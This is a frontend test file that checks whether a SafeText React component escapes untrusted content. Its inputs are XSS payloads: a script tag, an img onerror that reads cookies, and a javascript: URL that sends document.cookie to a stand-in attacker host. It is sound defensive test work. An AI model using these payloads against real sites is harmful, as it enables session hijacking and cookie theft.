import { describe, it, expect } from 'vitest';
import { render, screen } from '@testing-library/react';
import { SafeText } from '../components/common/SafeText';

describe('XSS Prevention & Untrusted Output Encoding', () => {
  it('renders script tags as literal inert text, never as executable DOM script elements', () => {
    const maliciousPayload = '<script>window.__xss_executed = true;</script>';

    render(
      <div data-testid="container">
        <SafeText content={maliciousPayload} />
      </div>
    );

    const container = screen.getByTestId('container');
    expect(container.querySelector('script')).toBeNull();
    expect(container.textContent).toContain('<script>window.__xss_executed = true;</script>');
    expect((window as any).__xss_executed).toBeUndefined();
  });

  it('safely escapes malicious img onerror attributes', () => {
    const imgPayload = '<img src="invalid-src" onerror="alert(document.cookie)" />';

    render(
      <div data-testid="img-container">
        <SafeText content={imgPayload} />
      </div>
    );

    const container = screen.getByTestId('img-container');
    expect(container.querySelector('img')).toBeNull();
    expect(container.innerHTML).not.toContain('<img');
    expect(container.textContent).toContain('<img src="invalid-src" onerror="alert(document.cookie)" />');
  });

  it('safely handles javascript: pseudo-protocol strings in content', () => {
    const jsProtocol = 'javascript:fetch("https://attacker.com/steal?"+document.cookie)';

    render(
      <div data-testid="protocol-container">
        <SafeText content={jsProtocol} />
      </div>
    );

    const container = screen.getByTestId('protocol-container');
    expect(container.querySelector('a')).toBeNull();
    expect(container.textContent).toBe(jsProtocol);
  });

  it('provides safe fallback string for null or empty strings without DOM corruption', () => {
    render(
      <div data-testid="fallback-container">
        <SafeText content={null} fallback="Standard Fallback" />
      </div>
    );

    expect(screen.getByTestId('fallback-container').textContent).toBe('Standard Fallback');
  });
});
